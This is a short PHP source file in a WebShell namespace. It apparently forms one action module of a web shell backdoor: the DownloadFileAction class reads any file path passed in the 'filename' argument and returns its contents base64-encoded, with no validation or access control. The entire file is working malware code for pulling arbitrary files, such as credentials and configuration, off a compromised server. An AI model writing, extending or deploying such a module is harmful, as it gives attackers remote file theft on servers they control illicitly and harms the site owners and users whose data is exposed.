<?php
namespace WebShell;

class DownloadFileAction implements Action
{
    public function run(array $args): string
    {
        // Open and read the requested file
        $fd = fopen($args['filename'], 'r');
        $content = fread($fd, filesize($args['filename']));

        // Return the base64 encoded contents of the file
        return base64_encode($content);
    }
}
?>
